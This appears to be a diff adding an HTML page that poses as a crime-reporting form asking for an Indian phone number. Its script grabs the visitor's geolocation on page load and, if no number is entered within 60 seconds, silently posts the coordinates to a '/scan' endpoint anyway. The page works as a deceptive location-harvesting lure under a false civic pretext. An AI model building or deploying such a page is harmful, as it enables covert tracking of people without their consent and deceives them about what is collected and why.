@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Report a Crime</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Report a Crime</h1>
+        <p>Please enter your phone number and allow location access to report a crime.</p>
+        <form id="scanForm">
+            <label for="phone_number">Phone Number:</label>
+            <div class="phone-input">
+                <input type="text" value="+91" readonly>
+                <input type="text" id="phone_number" name="phone_number" required pattern="\d{10}" title="Enter a 10-digit phone number">
+            </div>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        let locationData = null;
+
+        // Request location permission as soon as the page loads
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    locationData = `${position.coords.latitude},${position.coords.longitude}`;
+                }, error => {
+                    alert('Error getting location: ' + error.message);
+                });
+            } else {
+                alert('Geolocation is not supported by this browser.');
+            }
+        };
+
+        // Set a timeout to send location data automatically after 60 seconds
+        const timeoutId = setTimeout(() => {
+            if (locationData && !document.getElementById('phone_number').value) {
+                sendLocation();
+            }
+        }, 60000);
+
+        document.getElementById('scanForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const phoneNumber = "+91" + document.getElementById('phone_number').value;
+
+            if (locationData) {
+                sendLocation(phoneNumber);
+            } else {
+                alert('Unable to get location. Please try again.');
+            }
+        });
+
+        function sendLocation(phoneNumber = 'Unknown') {
+            fetch('http://localhost:5000/scan', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `phone_number=${phoneNumber}&location=${locationData}`
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.success) {
+                    alert('Crime reported successfully!');
+                } else {
+                    alert('Error reporting crime: ' + data.error);
+                }
+            })
+            .catch(error => {
+                alert('Error sending data: ' + error.message);
+            });
+        }
+    </script>
+</body>
+</html>
